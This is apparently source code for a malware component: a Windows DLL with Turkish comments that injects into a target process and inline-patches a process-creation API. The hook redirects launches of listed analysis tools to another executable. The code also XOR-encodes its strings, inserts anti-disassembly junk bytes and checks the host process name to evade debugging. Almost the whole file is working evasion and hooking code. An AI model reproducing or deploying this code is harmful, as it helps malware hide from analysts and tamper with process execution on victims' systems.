#include <windows.h>
#include <strsafe.h>
//#define EXPORTING_DLL
#include "hooker.h"
#include "..\loader\Katarlar.h"
#include "..\loader\genel.h"

#define CHANGED_BYTE_NUM		5
#define INSTRUCTOIN_SIZE		5
#define PUSH_ESP				0x54
#define RELATIVE_CALL_OPCODE	0xe8
#define RELATIVE_JUMP_OPCODE	0xe9

#define ANTI_ASM
#define ANTI_DBG

TCHAR szP1[] = PROCNAME01;
TCHAR szP2[] = PROCNAME02;
TCHAR szP3[] = PROCNAME03;
TCHAR szP4[] = PROCNAME04;
TCHAR szP5[] = PROCNAME05;
TCHAR szP6[] = PROCNAME06;

PTSTR szAnalizProcs[] = { szP1, szP2, szP3, szP4, szP5, szP6 };

TCHAR gszDllName[] = HOOKDLL;
CHAR gszFuncName[] = HOOKFUNC;
TCHAR gszParentProcName[] = INJ_TARGET_PROC_NAME;
TCHAR gszKatar[] = RANDOM_PROC_NAME; // rasgele olacak proses ismi
CHAR gszSifre[] = KATAR_SIFRE;

PTCHAR gszProcName = CHOSENEXENAME;

void XorEncode(PBYTE pbVeri, DWORD dwSize, PBYTE bSifre, DWORD dwSifreSize){
	for (DWORD i = 0; i < dwSize; i++)
		if (pbVeri[i] != 0 && pbVeri[i] != bSifre[i % dwSifreSize])
			pbVeri[i] = pbVeri[i] ^ bSifre[i % dwSifreSize];
}

void DecodeA(PCHAR szVeri){
#ifdef ENCODED_STRINGS
	XorEncode((PBYTE)szVeri, strlen(szVeri), (PBYTE)gszSifre, SIFRE_SIZE);
#endif
}

void DecodeW(PTCHAR szVeri){
#ifdef ENCODED_STRINGS
	XorEncode((PBYTE)szVeri, lstrlen(szVeri) * 2, (PBYTE)gszSifre, SIFRE_SIZE);
#endif
}

void HookAPIFunc(PTSTR szLibName, PSTR szFuncName, PVOID pHookFuncAdr){
	// Windows API hooking:
	// deðiþtirilecek BYTE lar için ve geri dönüþ jmp ý için yer aç
	PBYTE pbDepo = (PBYTE)VirtualAlloc(NULL, 10, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (pbDepo == NULL){
		HATA(L"HookAPIFunc", L"VirtualAlloc");
		goto temizle;
	}
	// virtualfree yapmak gerekir mi?kalýcý olduðu için gerekmemesi lazým

	// find Dll handle (orn: ntdll/kernel32 )
	HMODULE hDll = GetModuleHandle(szLibName);
	if (hDll == NULL){
		HATA(L"HookAPIFunc", L"GetModuleHandle");
		goto temizle;	
	}

#ifdef ANTI_ASM 
	__asm{
		xor eax, eax
			jnz HookAPIFunc
			jz label1			
			__emit 0xEA
	}
label1:
#endif
	
	// find API func adres ( NtCreaterPocessEx/CreateProcessW )
	DWORD_PTR dwpApiFunc = (DWORD_PTR)GetProcAddress(hDll, szFuncName);
	if (dwpApiFunc == NULL){
		HATA(L"HookAPIFunc", L"GetProcAddress");
		goto temizle;
	}

	// hook içinde kullanýlacak PTSTR leri çöz
	for each (PTSTR szAnalizProc in szAnalizProcs){
		DecodeW(szAnalizProc);
	}

	// API func kodunu deðiþtirebilmek için izinlerini deðiþtir
	DWORD lpflOldProtect = 0;
	if (!VirtualProtect((LPVOID)dwpApiFunc, CHANGED_BYTE_NUM, PAGE_EXECUTE_READWRITE, &lpflOldProtect)){ //TRUE of FALSE
		HATA(L"HookAPIFunc", L"GetProcessID");
		goto temizle;
	}

	DWORD dwIndDepo = 0;
	// depoya push esp koy
	pbDepo[dwIndDepo++] = PUSH_ESP;

	// depodan call yapýlacak hook func adresi için relative adresi hesapla 
	DWORD_PTR dwpHookFunc = (DWORD_PTR)pHookFuncAdr;
	DWORD dwDepo2HookFuncRAdr = dwpHookFunc - (DWORD_PTR)(pbDepo + dwIndDepo) - INSTRUCTOIN_SIZE;

	// depoya call hook func komutunu koy
	pbDepo[dwIndDepo++] = RELATIVE_CALL_OPCODE;
	*(PDWORD)(pbDepo + dwIndDepo) = dwDepo2HookFuncRAdr;
	dwIndDepo += 4;

	// depoya deðiþtirilecek 5 byte veriyi kopyala
	for (int i = 0; i < CHANGED_BYTE_NUM; i++)
		pbDepo[dwIndDepo++] = PBYTE(dwpApiFunc)[i];

	// API fonksiyona dönüþ jump adresini hesapla ve depoya relative jump yaz	
	DWORD dwApiReturnRAdr = (dwpApiFunc + CHANGED_BYTE_NUM) - (DWORD_PTR)(pbDepo + dwIndDepo) - INSTRUCTOIN_SIZE;
	pbDepo[dwIndDepo++] = RELATIVE_JUMP_OPCODE;
	*PDWORD(pbDepo + dwIndDepo) = dwApiReturnRAdr;

	// API function baþýna yazýlacak relative jump adresini hesapla (depoya atlanacak)
	DWORD dwJumpToDepoRAdr = (DWORD_PTR)pbDepo - dwpApiFunc - INSTRUCTOIN_SIZE;

	// hesaplanan relative adresi API fonksiyonun baþýna yaz
	*(PBYTE)dwpApiFunc = RELATIVE_JUMP_OPCODE;
	*(PDWORD)(dwpApiFunc + 1) = dwJumpToDepoRAdr;

temizle:
	return;
}

void _stdcall HookFunc(DWORD pEsp){
	PTCHAR szProcName = PTCHAR(*PDWORD_PTR(pEsp + 4));	// ilk parametre
	PTCHAR szProcName2 = PTCHAR(*PDWORD_PTR(pEsp + 8)); // ikinci parametre
	BOOL foundAnalizProc = FALSE;
	// bütün karakterleri küçült
	int i = -1;
	while (szProcName2[++i])  szProcName2[i] = tolower(szProcName2[i]);
	
	// ikinci parametrede listedeki proses isimlerinden biri geçiyor mu?
	for each (PTSTR szAnalizProc in szAnalizProcs){
		if (wcsstr(szProcName2, szAnalizProc) != NULL){
			foundAnalizProc = TRUE;
			break;
		}
	}	
	
	if (foundAnalizProc) { // geçiyorsa
		MessageBox(
			NULL,
			szProcName,
			L"Dikkat",
			MB_ICONWARNING | MB_OK
			);

		*PDWORD(pEsp + 4) = (DWORD_PTR)gszProcName;
		*PDWORD(pEsp + 8) = (DWORD_PTR)gszProcName;
	} else if (wcsstr(szProcName2, gszKatar) != NULL){ // geçmiyorsa ve çalýþan proses farklý bir prosesse
		MessageBox(
			NULL,
			szProcName,
			L"Selam",
			MB_ICONINFORMATION | MB_OK
			);
	}
#ifdef _DEBUG
	else {
		MessageBox(
			NULL,
			szProcName,
			szProcName2,
			MB_ICONINFORMATION | MB_OK
			);
	}
#endif
}

BOOL APIENTRY DllMain(HANDLE hModule, DWORD  fdwReason, LPVOID lpReserved)
{
	// sadece load sýrasýnda çalýþ
	if (fdwReason != DLL_PROCESS_ATTACH)
		return TRUE;

//	CHAR szMsj[64] = "DllMain den selamlar";
	CHAR szTitle[32];
	ZeroMemory(szTitle, 32);

	//hangi prosesteyiz ? ismi nedir?		
	TCHAR lpFilename[MAX_PATH];
	GetModuleFileName(NULL, lpFilename, MAX_PATH);
	PTCHAR szProcessName = wcsrchr(lpFilename, L'\\') + 1;
	int i = -1;
	while (szProcessName[i++])  szProcessName[i] = tolower(szProcessName[i]);

	//istdiðimiz proses deðilse bir þey yapma çýk	
#ifdef ANTI_DBG
	DecodeW(gszParentProcName);
	if (wcsncmp(gszParentProcName, szProcessName, lstrlen(szProcessName)) != 0)
		return FALSE;
#endif 
	
/*	switch (fdwReason)
	{
	case DLL_PROCESS_ATTACH:
		// A process is loading the DLL.
		StringCchCopyA(szTitle, 32, "DLL_PROCESS_ATTACH");
		break;
	case DLL_THREAD_ATTACH:
		// A process is creating a new thread.
		StringCchCopyA(szTitle, 32, "DLL_THREAD_ATTACH");
		break;
	case DLL_THREAD_DETACH:
		// A thread exits normally.
		StringCchCopyA(szTitle, 32, "DLL_THREAD_DETACH");
		break;
	case DLL_PROCESS_DETACH:
		// A process unloads the DLL.
		StringCchCopyA(szTitle, 32, "DLL_PROCESS_DETACH");
		break;
	}

	int msgboxID = MessageBoxA(
		NULL,		
		szTitle,
		szProcessName,
		MB_ICONINFORMATION | MB_OK
		);*/	
	if (fdwReason == DLL_PROCESS_ATTACH){
		DecodeW(gszDllName);
		DecodeA(gszFuncName);
		HookAPIFunc(gszDllName, gszFuncName, HookFunc);
	}

	return TRUE;
}




